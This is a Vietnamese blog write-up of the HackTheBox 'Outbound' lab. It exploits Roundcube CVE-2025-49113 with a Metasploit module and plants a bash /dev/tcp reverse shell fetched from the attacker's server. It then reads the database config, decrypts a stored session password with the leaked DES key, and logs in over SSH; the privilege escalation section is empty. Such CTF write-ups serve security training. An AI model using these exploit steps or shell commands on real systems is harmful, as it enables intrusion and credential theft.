---
layout: post
author: Neo
title: Hackthebox - Outbound
date: 2025-07-27
tags:
  - Roundcube Webmail
  - CVE-2025-49113
  - msfconsole
  - ssh
  - CVE-2025-27591
  - linux
  - hackthebox
categories: ctf
---
0. this unordered seed list will be replaced by toc as unordered list
{:toc}

![intro](/assets/img/2025-07-27-HTB-Outbound/Outbound.webp)

## Reconnaissance and Scanning

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)z 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Thêm domain vào file host

```bash
sudo nano /etc/hosts
```

```bash
10.10.11.77     mail.outbound.htb       outbound.htb
```

## Enumeration and Gaining access

### Vhost, directories

Sau khi thử tìm vhost với `ffuf` và directories với `dirsearch` thì tôi không nhận được bất kỳ kết quả nào có thể sử dụng được.

### Port 80

Sử dụng `whatweb` 

```bash
┌──(neo㉿fs0ci3ty)-[~]
└─$ whatweb http://mail.outbound.htb
http://mail.outbound.htb [200 OK] Bootstrap, Content-Language[en], Cookies[roundcube_sessid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], HttpOnly[roundcube_sessid], IP[10.10.11.77], JQuery, PasswordField[_pass], RoundCube, Script, Title[Roundcube Webmail :: Welcome to Roundcube Webmail], X-Frame-Options[sameorigin], nginx[1.24.0]
```

Truy cập web bằng trình duyệt, sử dụng user-pass được cung cấp trước để đăng nhập

`tyler:LhKL1o9Nm3X2`

![one](/assets/img/2025-07-27-HTB-Outbound/1.webp)

### CVE-2025-49113

Tìm kiếm exploit của **Roubdcube Webmail 1.6.10** tôi nhận được kết quả là [CVE-2025-49113](https://www.exploit-db.com/exploits/52324). Đây là một lỗ hổng RCE tồn tại trên Roundcube webmail từ phiên bản 1.5.0 đến 1.6.10, lỗ hổng cho phép kẻ tấn công thực thi mã từ xa trên server, chỉ cần có tài khoản đăng nhập webmail.

Phân tích một chút về lỗ hổng này trên exploit-db thì nó đã có phiên bản cho metasploit. Tôi sẽ tải nó về và import nó vào msf của mình.

Đầu tiên, tải payload về thư mục của metasploit

```bash
┌──(kali㉿kali)-[~]
└─$ cd /usr/share/metasploit-framework/modules/exploits/multi/http 

┌──(kali㉿kali)-[/usr/…/modules/exploits/multi/http]
└─$ sudo wget https://www.exploit-db.com/download/52324 -O roundcube_auth_rce_cve_2025_49113.rb
--2025-08-01 03:40:55--  https://www.exploit-db.com/exploits/52324
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘roundcube_auth_rce_cve_2025_49113.rb’

roundcube_auth_rce_cve_2025_49113.rb                [   <=>                                                                                               ] 147.20K   238KB/s    in 0.6s    

2025-08-01 03:40:57 (238 KB/s) - ‘roundcube_auth_rce_cve_2025_49113.rb’ saved [150728]
```

Bật `msfconsole` và reload lại modules

```
┌──(kali㉿kali)-[/usr/…/modules/exploits/multi/http]
└─$ msfconsole -q
msf6 > reload_all
[*] Reloading modules from all module paths...
[-] Unknown command: reload. Did you mean load? Run the help command for more details.

                                   .,,.                  .
                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
                  d888888P      '7$$$$\""""''^^`` .7$$$|D*"'```         ?88'
  d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*"`   d8P       ?8b  88P
  88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"`       d8P d8888b $whi?88b 88b
 d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*" ?88,.d88b, d88 d8P' ?88 88P `?8b                                                                                                                
d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"`    `?88'  ?88 ?88 88b  d88 d88                                                                                                                     
                          .a#$$$$$$"`          88b  d8P  88b`?8888P'                                                                                                                         
                       ,s$$$$$$$"`             888888P'   88n      _.,,,ass;:                                                                                                                
                    .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'                                                                                                              
                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'                                                                                                               
              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'                                                                                                                
           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--""''^^/$$$$$$'                                                                                                                 
_______________________________________________________________   ,&$$$$$$'_____                                                                                                             
                                                                 ll&&$$$$'                                                                                                                   
                                                              .;;lll&&&&'                                                                                                                    
                                                            ...;;lllll&'                                                                                                                     
                                                          ......;;;llll;;;....                                                                                                               
                                                           ` ......;;;;... .  .                                                                                                              
                                                                                                                                                                                             

       =[ metasploit v6.4.64-dev                          ]
+ -- --=[ 2520 exploits - 1296 auxiliary - 431 post       ]
+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/
```

Kiểm tra lại module và setup payload

```bash
msf6 > search roundcube

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank       Check  Description
   -  ----                                                  ---------------  ----       -----  -----------
   0  auxiliary/gather/roundcube_auth_file_read             2017-11-09       normal     No     Roundcube TimeZone Authenticated File Disclosure
   1  exploit/multi/http/roundcube_auth_rce_cve_2025_49113  2025-06-02       excellent  Yes    Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization
   2    \_ target: Linux Dropper                            .                .          .      .
   3    \_ target: Linux Command                            .                .          .      .


Interact with a module by name or index. For example info 3, use 3 or use exploit/multi/http/roundcube_auth_rce_cve_2025_49113
After interacting with a module you can manually set a TARGET with set TARGET 'Linux Command'

msf6 > use 3
[*] Additionally setting TARGET => Linux Command
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > options

Module options (exploit/multi/http/roundcube_auth_rce_cve_2025_49113):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HOST                        no        The hostname of Roundcube server
   PASSWORD                    yes       Password to login with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The URI of the Roundcube Application
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME                    yes       Email User to login with
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux Command



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set host mail.outbound.htb
host => mail.outbound.htb
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set username tyler
username => tyler
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set password `tyler:LhKL1o9Nm3X2`
password => `tyler:LhKL1o9Nm3X2`
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set password LhKL1o9Nm3X2
password => LhKL1o9Nm3X2
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set lhost tun0
lhost => 10.10.14.61
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > run
[-] Msf::OptionValidateError One or more options failed to validate: RHOSTS.
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set rhosts mail.outbound.htb
rhosts => mail.outbound.htb
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > run
[*] Started reverse TCP handler on 10.10.14.61:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Extracted version: 10610
[+] The target appears to be vulnerable.
[*] Fetching CSRF token...
[+] Extracted token: mTWgKqeFiXho2nnC9ve1chryup8SHHtN
[*] Attempting login...
[+] Login successful.
[*] Preparing payload...
[+] Payload successfully generated and serialized.
[*] Uploading malicious payload...
[+] Exploit attempt complete. Check for session.
[*] Command shell session 1 opened (10.10.14.61:4444 -> 10.10.11.77:36418) at 2025-08-01 15:47:31 +0700
```

Bingo!!!

Tôi sẽ up thêm 1 reverse shell để giữ kết nối và upgrade shell, thuận tiện hơn cho việc khai thác. 

```bash
nano revshell.sh

/bin/bash -i >& /dev/tcp/10.10.14.61/9001 0>&1
```

```bash
┌──(neo㉿fs0ci3ty)-[~]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Quay trở lại bên msfconsole, tôi sẽ tải reverse shell lên đây

```bash
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/bash
pwd
/
ls -la /var/www/html
total 28
drwxr-xr-x 1 root     root     4096 Jun  6 18:55 .
drwxr-xr-x 1 root     root     4096 Jun  6 18:55 ..
-rw-r--r-- 1 root     root      615 Jun  6 18:55 index.nginx-debian.html
drwxr-xr-x 1 www-data www-data 4096 Jun  6 18:55 roundcube
cd /var/www/html/roundcube
script -qc /bin/bash /dev/null
www-data@mail:/var/www/html/roundcube$

www-data@mail:/var/www/html/roundcube$ wget http://10.10.14.61:8000/revshell.sh
<roundcube$ wget http://10.10.14.61:8000/revshell.sh
--2025-08-01 08:43:50--  http://10.10.14.61:8000/revshell.sh
Connecting to 10.10.14.61:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 47 [text/x-sh]
Saving to: 'revshell.sh'

revshell.sh         100%[===================>]      47  --.-KB/s    in 0s

2025-08-01 08:43:50 (5.33 MB/s) - 'revshell.sh' saved [47/47]
```

Trước khi chạy shell thì bật listener

```bash
┌──(neo㉿fs0ci3ty)-[~]
└─$ rlwrap nc -lnvp 9001
listening on [any] 9001 ...
```

```bash
www-data@mail:/var/www/html/roundcube$ chmod +x revshell.sh
chmod +x revshell.sh
www-data@mail:/var/www/html/roundcube$ ./revshell.sh
./revshell.sh
```

Quay trở lại listener

```bash
┌──(neo㉿fs0ci3ty)-[~]
└─$ rlwrap nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.61] from (UNKNOWN) [10.10.11.77] 45566
www-data@mail:/var/www/html/roundcube$
www-data@mail:/var/www/html/roundcube$ script -qc /bin/bash /dev/null
script -qc /bin/bash /dev/null
www-data@mail:/var/www/html/roundcube$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@mail:/var/www/html/roundcube$ ls -la
ls -la
total 1392
drwxr-xr-x  1 www-data www-data   4096 Aug  1 08:43 .
drwxr-xr-x  1 root     root       4096 Jun  6 18:55 ..
-rw-r--r--  1 www-data www-data   2553 Feb  8 08:47 .htaccess
-rw-r--r--  1 www-data www-data 216244 Feb  8 08:47 CHANGELOG.md
-rw-r--r--  1 www-data www-data  12714 Feb  8 08:47 INSTALL
-rw-r--r--  1 www-data www-data  35147 Feb  8 08:47 LICENSE
-rw-r--r--  1 www-data www-data   3853 Feb  8 08:47 README.md
-rw-r--r--  1 www-data www-data   1049 Feb  8 08:47 SECURITY.md
drwxr-xr-x  7 www-data www-data   4096 Feb  8 08:47 SQL
-rw-r--r--  1 www-data www-data   4657 Feb  8 08:47 UPGRADING
drwxr-xr-x  2 www-data www-data   4096 Feb  8 08:47 bin
-rw-r--r--  1 www-data www-data   1086 Feb  8 08:47 composer.json
-rw-r--r--  1 www-data www-data  56802 Feb  8 08:47 composer.lock
drwxr-xr-x  2 www-data www-data   4096 Jun  6 18:55 config
-rw-r--r--  1 www-data www-data  11200 Feb  8 08:47 index.php
-rw-r--r--  1 www-data www-data 956174 Jul  1 14:58 lin.sh
drwxr-xr-x  1 www-data www-data   4096 Jun 11 07:46 logs
-rwxr-xr-x  1 www-data www-data  35032 Jul 17 13:52 nc
drwxr-xr-x 37 www-data www-data   4096 Feb  8 08:47 plugins
drwxr-xr-x  8 www-data www-data   4096 Feb  8 08:47 program
drwxr-xr-x  3 www-data www-data   4096 Jun  6 18:55 public_html
-rwxr-xr-x  1 www-data www-data     47 Aug  1  2025 revshell.sh
drwxr-xr-x  3 www-data www-data   4096 Feb  8 08:47 skins
drwxr-xr-x  1 www-data www-data   4096 Aug  1 08:45 temp
drwxr-xr-x 14 www-data www-data   4096 Feb  8 08:47 vendor
-rw-r--r--  1 www-data www-data    653 Aug  1 08:39 wget-log
```

Sau khi ngồi nghiên cứu source của [Roundcubemail](https://github.com/roundcube/roundcubemail) trên github và kết hợp với những gì đang có, tôi tìm thấy phần config của DB trong thư mục config.

```bash
www-data@mail:/var/www/html/roundcube$ cat config/config.inc.php
cat config/config.inc.php
<?php

/*
 +-----------------------------------------------------------------------+
 | Local configuration for the Roundcube Webmail installation.           |
 |                                                                       |
 | This is a sample configuration file only containing the minimum       |
 | setup required for a functional installation. Copy more options       |
 | from defaults.inc.php to this file to override the defaults.          |
 |                                                                       |
 | This file is part of the Roundcube Webmail client                     |
 | Copyright (C) The Roundcube Dev Team                                  |
 |                                                                       |
 | Licensed under the GNU General Public License version 3 or            |
 | any later version with exceptions for skins & plugins.                |
 | See the README file for a full license statement.                     |
 +-----------------------------------------------------------------------+
*/

$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:**********@localhost/roundcube';

// IMAP host chosen to perform the log-in.
// See defaults.inc.php for the option description.
$config['imap_host'] = 'localhost:143';

// SMTP server host (for sending mails).
// See defaults.inc.php for the option description.
$config['smtp_host'] = 'localhost:587';

// SMTP username (if required) if you use %u as the username Roundcube
// will use the current username for login
$config['smtp_user'] = '%u';

// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config['smtp_pass'] = '%p';

// provide an URL where a user can get support for this Roundcube installation
// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
$config['support_url'] = '';

// Name your service. This is displayed on the login screen and in the window title
$config['product_name'] = 'Roundcube Webmail';

// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

// List of active plugins (in plugins/ directory)
$config['plugins'] = [
    'archive',
    'zipdownload',
];

// skin name: folder from skins/
$config['skin'] = 'elastic';
$config['default_host'] = 'localhost';
$config['smtp_server'] = 'localhost';
```

Trước khi truy cập DB thì tôi muốn note lại một số thông tin về thằng Roundcubemail này.

Về cơ bản thì vì nó là 1 mail server nên là nó có smtp, có imap và sử dụng mysql làm DB. Tuy nhiên, Roundcubemail không lưu thông tin đăng nhập của user trong DB, nó chỉ giữ trong session để duy trì kết nối IMAP và SMTP.

Một phần nữa đáng chú ý là mã hóa

```bash
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

Đây là khóa mã hóa được dùng để mã hóa mật khẩu người dùng trong session. Nếu key này bị lộ, tôi có thể giải mã các session được lưu trong DB và lấy lại mật khẩu IMAP. 

Ngoài ra, bên trong source trên github tôi cũng tìm thấy [decrypt.sh](https://github.com/roundcube/roundcubemail/blob/master/bin/decrypt.sh), có thể là để giải mã session.

Đăng nhập DB

```bash
www-data@mail:/var/www/html/roundcube$ mysql -u roundcube -p******** roundcube
<ndcube$ mysql -u roundcube -p******** roundcube
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 42567
Server version: 10.11.13-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [roundcube]> show tables;
show tables;
+---------------------+
| Tables_in_roundcube |
+---------------------+
| cache               |
| cache_index         |
| cache_messages      |
| cache_shared        |
| cache_thread        |
| collected_addresses |
| contactgroupmembers |
| contactgroups       |
| contacts            |
| dictionary          |
| filestore           |
| identities          |
| responses           |
| searches            |
| session             |
| system              |
| users               |
+---------------------+
17 rows in set (0.000 sec)

MariaDB [roundcube]> select * from session;
select * from session;
+----------------------------+---------------------+------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| sess_id                    | changed             | ip         | vars                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
+----------------------------+---------------------+------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+                                                     |
| 6a5ktqih5uca6lj8vrmgh9v0oh | 2025-06-08 15:46:40 | 172.17.0.1 | bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1s*************** |
+----------------------------+---------------------+------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
8 rows in set (0.000 sec)

MariaDB [roundcube]>
```

Thử decode bằng base64

```bash
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJA******xcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s:2:"10";
```

Tôi có user `jacob` và password dưới dạng mã hóa `L7Rv00A8TuwJA******xcSgnIk25Am/`

Sử dụng [decrypt.sh](https://github.com/roundcube/roundcubemail/blob/master/bin/decrypt.sh) để thử giải mã nó

Trên reverse shell

```bash
www-data@mail:/var/www/html/roundcube$ ./bin/decrypt.sh 'L7Rv00A8TuwJA******xcSgnIk25Am/'
<./bin/decrypt.sh 'L7Rv00A8TuwJA******xcSgnIk25Am/'
595mO8D******
```

Thử đăng nhập vào những nơi có thể bao gồm ssh và webmail, tôi có user webmail mới

![one](/assets/img/2025-07-27-HTB-Outbound/2.webp)

Một trong 2 mail có chứa một password của `jacob`. Thử nó với ssh

```bash
┌──(neo㉿fs0ci3ty)-[~]
└─$ ssh jacob@mail.outbound.htb
The authenticity of host 'mail.outbound.htb (10.10.11.77)' can't be established.
ED25519 key fingerprint is SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'mail.outbound.htb' (ED25519) to the list of known hosts.
jacob@mail.outbound.htb's password:
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Aug  4 07:09:58 AM UTC 2025

  System load:  0.08              Processes:             268
  Usage of /:   74.9% of 6.73GB   Users logged in:       1
  Memory usage: 13%               IPv4 address for eth0: 10.10.11.77
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Aug  4 06:59:12 2025 from 10.10.14.40
jacob@outbound:~$ id
uid=1002(jacob) gid=1002(jacob) groups=1002(jacob),100(users)
jacob@outbound:~$ ls
user.txt
jacob@outbound:~$
```

## Privilege escalation

